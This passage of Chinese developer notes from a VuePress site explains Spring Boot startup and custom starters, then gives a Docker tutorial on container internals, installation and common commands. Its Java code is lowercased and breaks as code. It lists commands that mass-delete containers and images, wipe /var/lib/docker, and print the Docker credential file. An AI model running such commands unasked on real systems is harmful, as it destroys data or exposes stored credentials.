启动配置原理\n\n\n# 启动流程：\n\n * 创建springapplication对象\n\n * 调用initialize方法\n\n    private void initialize(object[] sources) {\n        if (sources != null && sources.length > 0) {\n            this.sources.addall(arrays.aslist(sources));\n        }\n\t\t\t// 判断是否为web应用\n        this.webenvironment = this.deducewebenvironment();\n      \n      // 类路径下寻找applicationinitalizer保存\n      this.setinitializers(this.getspringfactoriesinstances(applicationcontextinitializer.class));\n      // 类路径下寻找  applicationlistener 并保存\n      this.setlisteners(this.getspringfactoriesinstances(applicationlistener.class));\n      // 多个配置类中找到有main方法的配置类。 \n      this.mainapplicationclass = this.deducemainapplicationclass();\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n * 运行run方法\n\npublic configurableapplicationcontext run(string... args) {\n        stopwatch stopwatch = new stopwatch();\n        stopwatch.start();\n        configurableapplicationcontext context = null;\n        failureanalyzers analyzers = null;\n        this.configureheadlessproperty();\n  // \t获取springapplicationrunlistener 从类路径下的mate-inf/spring.factories里寻找\n        springapplicationrunlisteners listeners = this.getrunlisteners(args);\n  \n  \t\t// 回掉所有listener的starting方法\n        listeners.starting();\n\n        try {\n          // 封装args\n            applicationarguments applicationarguments = new defaultapplicationarguments(args);\n          \t// 准备环境， 创建环境  配置环境  回调listener的environmentprepared  方法\n          configurableenvironment environment = this.prepareenvironment(listeners, applicationarguments);\n          \t// 打印启动时的banner \n          banner printedbanner = this.printbanner(environment);\n            \n          \t// 创建context ioc容器\n          context = this.createapplicationcontext();\n            \n          new failureanalyzers(context);\n          // 准备上下文环境\n       \t\t\t// 将env保存到ioc，获取所有的applicationinitalizer 调用initailze方法 ， 回调所有listener的contextprepared方法。 最后回调 listener的contextloaded方法\n          this.preparecontext(context, environment, liteners, applicationarguments, printedbanner);\n\t\t\t\t// 刷线容器 ioc容器初始化\n          this.refreshcontext(context);\n          // callrunner 获取所有的applicationrunner 、 然后获取所有的commandlinerunner 并运行他们的run方法\n            this.afterrefresh(context, applicationarguments);\n          // 回调listener的finished方法\n            listeners.finished(context, (throwable)null);\n            stopwatch.stop();\n            if (this.logstartupinfo) {\n                (new startupinfologger(this.mainapplicationclass)).logstarted(this.getapplicationlog(), stopwatch);\n            }\n// 返回ioc容器\n            return context;\n        } catch (throwable var9) {\n            this.handlerunfailure(context, listeners, (failureanalyzers)analyzers, var9);\n            throw new illegalstateexception(var9);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n\n\n\n# 事件监听机制\n\n几个重要的事件回调机制\n\n配置在meta-inf/spring.factories\n\napplicationcontextinitializer\n\nspringapplicationrunlistener\n\n只需要放在ioc容器中\n\napplicationrunner\n\ncommandlinerunner\n\n\n# springboot自定义starter\n\nstarter场景启动器：\n\n 1. 需要导入的依赖\n\n 2. 如何编写自动配置\n\n@configuration //指定这个类是一个配置类 \n@conditionalonxxx //在指定条件成立的情况下自动配置类生效 \n@autoconfigureafter //指定自动配置类的顺序 \n@bean //给容器中添加组件\n\n@configurationpropertie//结合相关xxxproperties类来绑定相关的配置\n@enableconfigurationproperties //让xxxproperties生效加入到容器中\n\n自动配置类要能加载 将需要启动就加载的自动配置类，配置在meta‐inf/spring.factories org.springframework.boot.autoconfigure.enableautoconfiguration=\\ org.springframework.boot.autoconfigure.admin.springapplicationadminjmxautoconfiguration,\\ org.springframework.boot.autoconfigure.aop.aopautoconfiguration,\\\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n\n\n# 步骤\n\n 1. 创建两个maven项目\n\n<project xmlns="http://maven.apache.org/pom/4.0.0" xmlns:xsi="http://www.w3.org/2001/xmlschema‐instance" xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven‐4.0.0.xsd"> <modelversion>4.0.0</modelversion>\n\n<groupid>com.atguigu.starter</groupid> \n  <artifactid>atguigu‐spring‐boot‐starter</artifactid> \n  <version>1.0‐snapshot</version>\n\n<!‐‐启动器‐‐> \n  <dependencies>\n\n<!‐‐引入自动配置模块‐‐> \n    <dependency> \n      <groupid>com.atguigu.starter</groupid> \n      <artifactid>atguigu‐spring‐boot‐starter‐autoconfigurer</artifactid> \n      <version>0.0.1‐snapshot</version> \n    </dependency> \n  </dependencies>\n\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n<?xml version="1.0" encoding="utf‐8"?>\n<project xmlns="http://maven.apache.org/pom/4.0.0" xmlns:xsi="http://www.w3.org/2001/xmlschema‐instance"\n\n         xsi:schemalocation="http://maven.apache.org/pom/4.0.0 http://maven.apache.org/xsd/maven4.0.0.xsd">\n\n    <modelversion>4.0.0</modelversion>\n\n    <groupid>com.atguigu.starter</groupid>\n    <artifactid>atguigu‐spring‐boot‐starter‐autoconfigurer</artifactid>\n    <version>0.0.1‐snapshot</version>\n    <packaging>jar</packaging>\n\n    <name>atguigu‐spring‐boot‐starter‐autoconfigurer</name>\n    <description>demo project for spring boot</description>\n\n    <parent>\n        <groupid>org.springframework.boot</groupid>\n        <artifactid>spring‐boot‐starter‐parent</artifactid>\n        <version>1.5.10.release</version>\n        <relativepath/>\n        <!‐‐ lookup parent from repository ‐‐>\n    </parent>\n\n    <properties>\n        <project.build.sourceencoding>utf‐8</project.build.sourceencoding>\n        <project.reporting.outputencoding>utf‐8</project.reporting.outputencoding>\n        <java.version>1.8</java.version>\n    </properties>\n\n    <dependencies>\n\n        <!‐‐引入spring‐boot‐starter；所有starter的基本配置‐‐>\n        <dependency>\n\n            <groupid>org.springframework.boot</groupid>\n\n            <artifactid>spring‐boot‐starter</artifactid>\n        </dependency>\n\n    </dependencies>\n\n</project>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n自定义properties\n\npackage com.atguigu.starter;\n\nimport org.springframework.boot.context.properties.configurationproperties;\n\n@configurationproperties(prefix = "atguigu.hello")\npublic class helloproperties {\nprivate string prefix; \n  private string suffix;\n\npublic string getprefix() { return prefix; }\n\npublic void setprefix(string prefix) { this.prefix = prefix; }\n\npublic string getsuffix() { return suffix; }\n\npublic void setsuffix(string suffix) { this.suffix = suffix; }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n自定义service\n\npackage com.atguigu.starter;\n\npublic class helloservice {\n\nhelloproperties helloproperties;\n\npublic helloproperties gethelloproperties() { return helloproperties; }\n\npublic void sethelloproperties(helloproperties helloproperties) { this.helloproperties = helloproperties; }\n\npublic string sayhellatguigu(string name){ \n  return helloproperties.getprefix()+"‐" +name + helloproperties.getsuffix(); }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n自动配置\n\npackage com.atguigu.starter;\n\nimport org.springframework.beans.factory.annotation.autowired; import org.springframework.boot.autoconfigure.condition.conditionalonwebapplication; import org.springframework.boot.context.properties.enableconfigurationproperties; import org.springframework.context.annotation.bean; import org.springframework.context.annotation.configuration;\n\n@configuration\n@conditionalonwebapplication //web应用才生效 @enableconfigurationproperties(helloproperties.class) \npublic class helloserviceautoconfiguration {\n\n  @autowired helloproperties helloproperties; \n  @bean \n  public helloservice helloservice(){\n\n    helloservice service = new helloservice();\n\n    service.sethelloproperties(helloproperties);\n\n    return service; \n  }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n',charsets:{cjk:!0},lastUpdated:"2022/04/27, 19:18:16",lastUpdatedTimestamp:1651087096e3},{title:"Docker",frontmatter:{title:"Docker",date:"2022-05-01T14:00:00.000Z",permalink:"/dev/java/eco/docker",author:{name:"p0jo",link:"https://wiki.pwddd.com"},categories:["开发","后端","微服务生态"],tags:["K8S","Docker","DockerCompose"],readingShow:"top"},regularPath:"/01.%E5%BC%80%E5%8F%91/101.%E5%90%8E%E7%AB%AF/1012.%E5%BE%AE%E6%9C%8D%E5%8A%A1%E7%94%9F%E6%80%81/00.Docker.html",relativePath:"01.开发/101.后端/1012.微服务生态/00.Docker.md",key:"v-63e88fe4",path:"/dev/java/eco/docker/",headers:[{level:2,title:"Docker 理念",slug:"docker-理念",normalizedTitle:"docker 理念",charIndex:13},{level:2,title:"Linux容器的实现方式",slug:"linux容器的实现方式",normalizedTitle:"linux容器的实现方式",charIndex:204},{level:3,title:"NameSpace",slug:"namespace",normalizedTitle:"namespace",charIndex:694},{level:3,title:"Cgroups",slug:"cgroups",normalizedTitle:"cgroups",charIndex:289},{level:3,title:"Chroot",slug:"chroot",normalizedTitle:"chroot",charIndex:1993},{level:2,title:"Docker和虚拟机的区别",slug:"docker和虚拟机的区别",normalizedTitle:"docker和虚拟机的区别",charIndex:2139},{level:3,title:"虚拟机",slug:"虚拟机",normalizedTitle:"虚拟机",charIndex:1272},{level:3,title:"Docker",slug:"docker-2",normalizedTitle:"docker",charIndex:2},{level:2,title:"Docker的优势",slug:"docker的优势",normalizedTitle:"docker的优势",charIndex:2710},{level:2,title:"相关概念",slug:"相关概念",normalizedTitle:"相关概念",charIndex:3149},{level:3,title:"镜像",slug:"镜像",normalizedTitle:"镜像",charIndex:585},{level:3,title:"容器",slug:"容器",normalizedTitle:"容器",charIndex:170},{level:3,title:"仓库",slug:"仓库",normalizedTitle:"仓库",charIndex:3909},{level:2,title:"Centos安装Docker",slug:"centos安装docker",normalizedTitle:"centos安装docker",charIndex:4127},{level:3,title:"1. 卸载旧版本Docker",slug:"_1-卸载旧版本docker",normalizedTitle:"1. 卸载旧版本docker",charIndex:4146},{level:3,title:"2. 设置镜像仓库",slug:"_2-设置镜像仓库",normalizedTitle:"2. 设置镜像仓库",charIndex:4466},{level:3,title:"3. 安装Docker",slug:"_3-安装docker",normalizedTitle:"3. 安装docker",charIndex:4625},{level:3,title:"4. 配置镜像加速",slug:"_4-配置镜像加速",normalizedTitle:"4. 配置镜像加速",charIndex:4725},{level:3,title:"5. 启动Docker并测试",slug:"_5-启动docker并测试",normalizedTitle:"5. 启动docker并测试",charIndex:5646},{level:3,title:"6. Docker Run逻辑图",slug:"_6-docker-run逻辑图",normalizedTitle:"6. docker run逻辑图",charIndex:5726},{level:3,title:"99. 卸载方式",slug:"_99-卸载方式",normalizedTitle:"99. 卸载方式",charIndex:5749},{level:2,title:"Docker 常用命令",slug:"docker-常用命令",normalizedTitle:"docker 常用命令",charIndex:5842},{level:3,title:"帮助相关",slug:"帮助相关",normalizedTitle:"帮助相关",charIndex:5860},{level:3,title:"镜像相关命令",slug:"镜像相关命令",normalizedTitle:"镜像相关命令",charIndex:5962},{level:3,title:"容器相关命令",slug:"容器相关命令",normalizedTitle:"容器相关命令",charIndex:7104},{level:2,title:"镜像",slug:"镜像-2",normalizedTitle:"镜像",charIndex:585},{level:3,title:"UnionFS - 联合文件系统",slug:"unionfs-联合文件系统",normalizedTitle:"unionfs - 联合文件系统",charIndex:10120},{level:3,title:"Docker镜像加载原理",slug:"docker镜像加载原理",normalizedTitle:"docker镜像加载原理",charIndex:10374},{level:3,title:"Docker commit",slug:"docker-commit",normalizedTitle:"docker commit",charIndex:10784},{level:2,title:"容器数据卷",slug:"容器数据卷",normalizedTitle:"容器数据卷",charIndex:10981},{level:3,title:"命令行创建容器数据卷",slug:"命令行创建容器数据卷",normalizedTitle:"命令行创建容器数据卷",charIndex:11325},{level:3,title:"Dockerfile创建容器数据卷",slug:"dockerfile创建容器数据卷",normalizedTitle:"dockerfile创建容器数据卷",charIndex:11480},{level:3,title:"数据卷容器",slug:"数据卷容器",normalizedTitle:"数据卷容器",charIndex:11941},{level:2,title:"Docker安装常见的服务",slug:"docker安装常见的服务",normalizedTitle:"docker安装常见的服务",charIndex:12197},{level:3,title:"Docker 安装 Mysql",slug:"docker-安装-mysql",normalizedTitle:"docker 安装 mysql",charIndex:12215},{level:3,title:"Docker安装Redis",slug:"docker安装redis",normalizedTitle:"docker安装redis",charIndex:13517},{level:3,title:"Docker 安装 nginx",slug:"docker-安装-nginx",normalizedTitle:"docker 安装 nginx",charIndex:14516},{level:3,title:"Docker 安装 Tomcat",slug:"docker-安装-tomcat",normalizedTitle:"docker 安装 tomcat",charIndex:15407},{level:3,title:"Docker 安装 ES",slug:"docker-安装-es",normalizedTitle:"docker 安装 es",charIndex:15776},{level:3,title:"Docker 常见问题处置",slug:"docker-常见问题处置",normalizedTitle:"docker 常见问题处置",charIndex:17690},{level:2,title:"Dockerfile",slug:"dockerfile",normalizedTitle:"dockerfile",charIndex:11480},{level:3,title:"什么是Dockerfile",slug:"什么是dockerfile",normalizedTitle:"什么是dockerfile",charIndex:18154},{level:3,title:"Dockerfile解析过程",slug:"dockerfile解析过程",normalizedTitle:"dockerfile解析过程",charIndex:18278},{level:3,title:"Dockerfile的保留命令",slug:"dockerfile的保留命令",normalizedTitle:"dockerfile的保留命令",charIndex:18299},{level:3,title:"Dockerfile 打包 Springboot项目",slug:"dockerfile-打包-springboot项目",normalizedTitle:"dockerfile 打包 springboot项目",charIndex:21293},{level:2,title:"本地镜像发布",slug:"本地镜像发布",normalizedTitle:"本地镜像发布",charIndex:21613},{level:3,title:"2. 从Registry中拉取镜像",slug:"_2-从registry中拉取镜像",normalizedTitle:"2. 从registry中拉取镜像",charIndex:21849},{level:3,title:"3. 将镜像推送到Registry",slug:"_3-将镜像推送到registry",normalizedTitle:"3. 将镜像推送到registry",charIndex:21952},{level:3,title:"4. 选择合适的镜像仓库地址",slug:"_4-选择合适的镜像仓库地址",normalizedTitle:"4. 选择合适的镜像仓库地址",charIndex:22256},{level:3,title:"5. 示例",slug:"_5-示例",normalizedTitle:"5. 示例",charIndex:22400},{level:2,title:"高级网络和容器卷",slug:"高级网络和容器卷",normalizedTitle:"高级网络和容器卷",charIndex:22962},{level:3,title:"高级网络配置",slug:"高级网络配置",normalizedTitle:"高级网络配置",charIndex:22975},{level:3,title:"高级数据卷配置",slug:"高级数据卷配置",normalizedTitle:"高级数据卷配置",charIndex:25773},{level:2,title:"Docker compose",slug:"docker-compose",normalizedTitle:"docker compose",charIndex:26989},{level:3,title:"docker compose使用",slug:"docker-compose使用",normalizedTitle:"docker compose使用",charIndex:27008},{level:3,title:"docker-compose 模板文件",slug:"docker-compose-模板文件",normalizedTitle:"docker-compose 模板文件",charIndex:28283},{level:3,title:"docker-compose 常用命令",slug:"docker-compose-常用命令",normalizedTitle:"docker-compose 常用命令",charIndex:31994},{level:2,title:"docker可视化工具",slug:"docker可视化工具",normalizedTitle:"docker可视化工具",charIndex:34233}],excerpt:'<h1 id="docker"><a class="header-anchor" href="#docker">#</a> Docker</h1>\n<h2 id="docker-理念"><a class="header-anchor" href="#docker-理念">#</a> Docker 理念</h2>\n<blockquote>\n<p>Docker的主要目标是“Build，Ship and Run Any App,Anywhere”，也就是通过对应用组件的封装、分发、部署、运行等生命周期的管理，使用户的APP（可以是一个WEB应用或数据库应用等等）及其运行环境能够做到“一次封装，到处运行”。解决了运行环境和配置问题软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。</p>\n</blockquote>\n<p><img src="https://wiki-1251603812.cos.ap-shanghai.myqcloud.com/images/image-20220129195048442.png" alt="image-20220129195048442"></p>\n',headersStr:"Docker 理念 Linux容器的实现方式 NameSpace Cgroups Chroot Docker和虚拟机的区别 虚拟机 Docker Docker的优势 相关概念 镜像 容器 仓库 Centos安装Docker 1. 卸载旧版本Docker 2. 设置镜像仓库 3. 安装Docker 4. 配置镜像加速 5. 启动Docker并测试 6. Docker Run逻辑图 99. 卸载方式 Docker 常用命令 帮助相关 镜像相关命令 容器相关命令 镜像 UnionFS - 联合文件系统 Docker镜像加载原理 Docker commit 容器数据卷 命令行创建容器数据卷 Dockerfile创建容器数据卷 数据卷容器 Docker安装常见的服务 Docker 安装 Mysql Docker安装Redis Docker 安装 nginx Docker 安装 Tomcat Docker 安装 ES Docker 常见问题处置 Dockerfile 什么是Dockerfile Dockerfile解析过程 Dockerfile的保留命令 Dockerfile 打包 Springboot项目 本地镜像发布 2. 从Registry中拉取镜像 3. 将镜像推送到Registry 4. 选择合适的镜像仓库地址 5. 示例 高级网络和容器卷 高级网络配置 高级数据卷配置 Docker compose docker compose使用 docker-compose 模板文件 docker-compose 常用命令 docker可视化工具",content:'# Docker\n\n\n# Docker 理念\n\n> Docker的主要目标是“Build，Ship and Run Any App,Anywhere”，也就是通过对应用组件的封装、分发、部署、运行等生命周期的管理，使用户的APP（可以是一个WEB应用或数据库应用等等）及其运行环境能够做到“一次封装，到处运行”。解决了运行环境和配置问题软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。\n\n\n\n\n# Linux容器的实现方式\n\n> 一个正在运行的 Docker 容器，其实就是一个启用了多个 Linux Namespace 的应用进程，而这个进程能够使用的资源量，则受 Cgroups 配置的限制。这也是容器技术中一个非常重要的概念，即：容器是一个“单进程”模型。\n\n一个“容器”，实际上是一个由 Linux Namespace、Linux Cgroups 和 rootfs 三种技术构建出来的进程的隔离环境。\n\n 1. Namespace 的作用是“隔离”，它让应用进程只能看到该 Namespace 内的“世界”；修改进程视图的主要方法\n\n 2. Cgroups 的作用是“限制”，它给这个“世界”围上了一圈看不见的墙。制造约束的主要手段\n\n 3. 一组联合挂载在 /var/lib/docker/aufs/mnt 上的 rootfs，这一部分我们称为“容器镜像”（Container Image），是容器的静态视图；一个由 Namespace+Cgroups 构成的隔离环境，这一部分我们称为“容器运行时”（Container Runtime），是容器的动态视图。\n\n\n# NameSpace\n\n在容器中看到只有自己一个进程，但是这个进程其实是在宿主机上的 只不过是一个独立的namespace\n\n定义了5个命名空间结构体，多个进程可以使用同一个namespace\n\n 1. UTS： 运行内核的名称、版本、底层体系结构类型等信息（UNIX Timesharing System）\n\n 2. IPC： 与进程间通信（IPC)有关\n\n 3. MNT：已经装载的文件系统的视图 Mount Namespace，用于让被隔离进程只看到当前 Namespace 里的挂载点信息；\n\n 4. PID：有关进程ID的信息\n\n 5. NET：网络相关的命名空间参数 Network Namespace，用于让被隔离进程看到当前 Namespace 里的网络设备和配置。\n\n在 Linux 内核中，有很多资源和对象是不能被 Namespace 化的，最典型的例子就是：时间。\n\n为了让多个容器以沙盒的方式在宿主机上运行，就需要提前定义好各个容器能看到的边界。由于各个容器都是直接运行在宿主机系统上，因此需要内核对各个容器的上下文进行修改，让他们看上去是一个独立的操作系统。比如，指定PID为1的进程，指定网卡设备，指定文件系统挂载，指定用户等等。\n\nLinux操作系统内核从底层实现了为各个进程创建独立用户空间的功能，不同用户空间似于一个个独立的虚拟机系统，用户空间内部进程不能感知到其它用户空间中的进程状态。内核提供了六种Namespaces。\n\nUTS     HOSTNAME AND DOMAINNAME    主机名和域名隔离                内核版本：2.6.19\nUser                               用户隔离。运行进程的用户和组          内核版本：3.8.x\nMount                              挂载点隔离。即挂载点隔离，主要指根目录     内核版本：2.4.19\nIPC     Inter-process-connection   进程间通信隔离。消息队列、共享内容、信号量   内核版本：2.6.19\nPid     Process                                            \nID                                 PID隔离                   \nNet     Network                    网络隔离。网络设备、协议栈、端口        内核版本：2.6.29\n\n\n# Cgroups\n\nLinux Cgroups 就是 Linux 内核中用来为进程设置资源限制的一个重要功能。\n\nLinux Cgroups 的全称是 Linux Control Group。它最主要的作用，就是限制一个进程组能够使用的资源上限，包括 CPU、内存、磁盘、网络带宽等等。\n\n此外，Cgroups 还能够对进程进行优先级设置、审计，以及将进程挂起和恢复等操作。\n\n\n# Chroot\n\n如果需要在一个宿主机上运行多个容器，且容器之间相互隔离，那么第一个就需要系统库文件的依赖，对于一个容器而言，需要将其需要的系统文件单独复制出来一份，放到指定目录，并且需要让进程认为这就是根目录，而不是去调用宿主机系统上的库文件。Chroot就是一个切换根目录的方式。\n\n\n# Docker和虚拟机的区别\n\n比较了 Docker 和传统虚拟化方式的不同之处：\n\n * 传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程；\n\n * 而容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核， 而且也没有进行硬件虚拟。因此容器要比传统虚拟机更为轻便。\n\n * 每个容器之间互相隔离，每个容器有自己的文件系统 ，容器之间进程不会相互影响，能区分计算资源。\n\n\n# 虚拟机\n\n它可以在一种操作系统里面运行另一种操作系统，比如在Windows 系统里面运行Linux 系统。应用程序对此毫无感知，因为虚拟机看上去跟真实系统一模一样，而对于底层系统来说，虚拟机就是一个普通文件，不需要了就删掉，对其他部分毫无影响。这类虚拟机完美的运行了另一套系统，能够使应用程序，操作系统和硬件三者之间的逻辑不变。\n\n虚拟机的缺点：\n\n * 资源占用多\n * 冗余步骤多\n * 启动慢\n\n\n\n\n# Docker\n\nLinux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。有了容器，就可以将软件运行所需的所有资源打包到一个隔离的容器中。容器与虚拟机不同，不需要捆绑一整套操作系统，只需要软件工作所需的库资源和设置。系统因此而变得高效轻量并保证部署在任何环境中的软件都能始终如一地运行。\n\n\n\n\n# Docker的优势\n\nDocker是一个Client-Server结构的系统，Docker守护进程运行在主机上， 然后通过Socket连接从客户端访问，守护进程从客户端接受命令并管理运行在主机上的容器。 容器，是一个运行时环境，就是我们前面说到的集装箱。docker有着比虚拟机更少的抽象层。由亍docker不需要Hypervisor实现硬件资源虚拟化,运行在docker容器上的程序直接使用的都是实际物理机的硬件资源。因此在CPU、内存利用率上docker将会在效率上有明显优势。docker利用的是宿主机的内核,而不需要Guest OS。因此,当新建一个容器时,docker不需要和虚拟机一样重新加载一个操作系统内核。仍而避免引寻、加载操作系统内核返个比较费时费资源的过程,当新建一个虚拟机时,虚拟机软件需要加载Guest OS,返个新建过程是分钟级别的。而docker由于直接利用宿主机的操作系统,则省略了返个过程,因此新建一个docker容器只需要几秒钟。\n\n\n\n\n# 相关概念\n\n需要正确的理解仓储/镜像/容器这几个概念:\n\nDocker 本身是一个容器运行载体或称之为管理引擎。我们把应用程序和配置依赖打包好形成一个可交付的运行环境，这个打包好的运行环境就似乎 image镜像文件。只有通过这个镜像文件才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。\n\n * image 文件生成的容器实例，本身也是一个文件，称为镜像文件。\n * 一个容器运行一种服务，当我们需要的时候，就可以通过docker客户端创建一个对应的运行实例，也就是我们的容器\n * 至于仓储，就是放了一堆镜像的地方，我们可以把镜像发布到仓储中，需要的时候从仓储中拉下来就可以了。\n\n\n\n\n# 镜像\n\nDocker 镜像（Image）就是一个只读的模板。镜像可以用来创建 Docker 容器，一个镜像可以创建很多容器。\n\ndocker镜像的命名标准：\n\n${registry_ name}/${repository. name}/${image. name}:${tag. name}\ndocker.io/library/alpine:3.10.1\n\n\n1\n2\n\n\n\n# 容器\n\nDocker 利用容器（Container）独立运行的一个或一组应用。容器是用镜像创建的运行实例。\n\n它可以被启动、开始、停止、删除。每个容器都是相互隔离的、保证安全的平台。 可以把容器看做是一个简易版的 Linux 环境（包括root用户权限、进程空间、用户空间和网络空间等）和运行在其中的应用程序。\n\n容器的定义和镜像几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。\n\n\n# 仓库\n\n仓库（Repository）是集中存放镜像文件的场所。\n\n仓库(Repository)和仓库注册服务器（Registry）是有区别的。仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签（tag）。\n\n仓库分为公开仓库（Public）和私有仓库（Private）两种形式。\n\n最大的公开仓库是 Docker Hub，存放了数量庞大的镜像供用户下载。国内的公开仓库包括阿里云 、网易云等。\n\n\n# Centos安装Docker\n\n\n# 1. 卸载旧版本Docker\n\nsudo yum remove docker \\\n                  docker-client \\\n                  docker-client-latest \\\n                  docker-common \\\n                  docker-latest \\\n                  docker-latest-logrotate \\\n                  docker-logrotate \\\n                  docker-engine\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 2. 设置镜像仓库\n\nsudo yum install -y yum-utils\nsudo yum-config-manager \\\n    --add-repo \\\n    https://download.docker.com/linux/centos/docker-ce.repo\n\n\n1\n2\n3\n4\n\n\n\n# 3. 安装Docker\n\n sudo yum install docker-ce docker-ce-cli containerd.io docker-compose-plugin\n\n\n1\n\n\n\n# 4. 配置镜像加速\n\nsudo mkdir -p /etc/docker\nsudo tee /etc/docker/daemon.json <<-\'EOF\'\n{\n  "registry-mirrors": ["https://t9rco7kp.mirror.aliyuncs.com"]\n}\nEOF\nsudo systemctl daemon-reload\n\n# 其他配置\n\n# daemon.json 配置介绍\n{\n  "graph": "/data/docker",\n  "storage-driver": "overlay2",\n  "insecure-registries": ["registry.access.redhat.com","quay.io"],\n  "registry-mirrors": ["https://q2gr04ke.mirror.aliyuncs.com>"],\n  "bip": "172.24.38.1/24",\n  "exec-opts": ["native.cgroupdriver=systemd"],\n  "live-restore": true\n}\n\n# 配置项注意点：\n# graph: 该关键字未来将被弃用，可以采用 "data-root" 替代\n# storage-driver: 存储驱动，即分层文件系统\n# insecure-registries: 不安全的docker registries，即使用http协议推拉镜象\n# registry-mirrors: 加速站点，一般可以使用阿里、网易云、docker中国(<https://registry.docker-cn.com>)的地址\n# bip: 指定docker bridge地址(不能以.0结尾)，生产中建议采用 172.xx.yy.1/24,其中xx.yy为宿主机ip后四位，方便定位问题\n# 若启动失败，查看 /var/log/message 日志排错\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# 5. 启动Docker并测试\n\nsudo systemctl restart docker\ndocker run hello-world\n\n\n1\n2\n\n\n\n# 6. Docker Run逻辑图\n\n\n\n\n# 99. 卸载方式\n\nsystemctl stop docker \nyum -y remove docker-ce\nrm -rf /var/lib/docker\n\n\n1\n2\n3\n\n\n\n# Docker 常用命令\n\n\n\n\n# 帮助相关\n\n# 查看版本\n\ndocker version\n\n\n1\n\n\n\n\n# 查看docker信息\n\ndocker info\n\n\n1\n\n\n\n\n# 查看帮助\n\ndocker --help\n\n\n1\n\n\n\n# 镜像相关命令\n\n# 1.查看本机中所有镜像\ndocker images\t--------------------------\t列出本地所有镜像\n-a\t\t\t列出所有镜像（包含中间映像层）\n-q\t\t\t只显示镜像id\n\n# 2.搜索镜像\ndocker search [options] 镜像名\t-------------------\t去dockerhub上查询当前镜像\n-s 指定值\t\t列出收藏数不少于指定值的镜像\n--no-trunc\t  显示完整的镜像信息\n\n# 3.从仓库下载镜像\ndocker pull 镜像名[:TAG|@DIGEST]\t----------------- 下载镜像\n\n# 4.删除镜像\ndocker rmi 镜像名\t--------------------------  删除镜像\n-f\t\t强制删除\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n# 登录退出DockerHub\n\ndocker login docker.io\ncat /root/.docker/config.json\n\n\n1\n2\n\n\n\n\n# 列举系统上的镜像\n\ndocker images\noptions：\n\t-a   显示本机所有镜像\n\t-q   只显示id\n\t--digest  只显示摘要信息\n\t--no-trunc 显示完整镜像信息\n\n\n1\n2\n3\n4\n5\n6\n\n\n# 查找镜像\n\ndocker search xxx\noptions:\n\t--no-strunc 显示完整的镜像信息\n\n\n1\n2\n3\n\n\n# 拉取镜像\n\ndocker pull xxx[:版本]\n\n\n1\n\n\n# 删除镜像\n\ndocker rmi xxx\n\neg.\ndocker rmi centos 删除一个镜像\ndocker rmi centos:latest centos:7.1 删除多个\ndocker rmi $(docker images -aq) 删除全部\ndocker rmi -f xxx 强制删除\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 镜像标签\n\ndocker tag d4ff818577bc docker.io/zhangsan404/alpine:latest\n\n\n1\n\n\n\n\n# 推送镜像到远端\n\ndocker push docker.io/zhangsan404/alpine:latest\n\n\n1\n\n\n# 保存镜像到本地\n\ndocker save zhangsan404/alpine:test > alpine_test.tar\n\n\n1\n\n\n\n\n# 本地镜像导入\n\ndocker load < alpine_test.tar\n\n\n1\n\n\n\n\n\n# 容器相关命令\n\n# 1.运行容器\ndocker run 镜像名\t--------------------------\t镜像名新建并启动容器\n--name \t\t\t\t\t别名为容器起一个名字\n-d\t\t\t\t\t\t\t启动守护式容器（在后台启动容器）\n-p \t\t\t\t\t\t\t映射端口号：原始端口号\t\t 指定端口号启动\n\n例：docker run -it --name myTomcat -p 8888:8080 tomcat\ndocker run -d --name myTomcat -P tomcat\n\n# 2.查看运行的容器\ndocker ps\t\t\t\t\t--------------------------\t列出所有正在运行的容器\n-a\t\t\t正在运行的和历史运行过的容器\n-q\t\t\t静默模式，只显示容器编号\n\n# 3.停止|关闭|重启容器\ndocker start   容器名字或者容器id  --------------- 开启容器\ndocker restart 容器名或者容器id    --------------- 重启容器\ndocker stop  容器名或者容器id \t    ------------------ 正常停止容器运行\ndocker kill  容器名或者容器id      ------------------ 立即停止容器运行\n\n# 4.删除容器\ndocker rm -f 容器id和容器名     \ndocker rm -f $(docker ps -aq)\t\t--------------------------\t删除所有容器\n\n# 5.查看容器内进程\ndocker top 容器id或者容器名 ------------------ 查看容器内的进程\n\n# 6.查看查看容器内部细节\ndocker inspect 容器id \t\t------------------ 查看容器内部细节\n\n# 7.查看容器的运行日志\ndocker logs 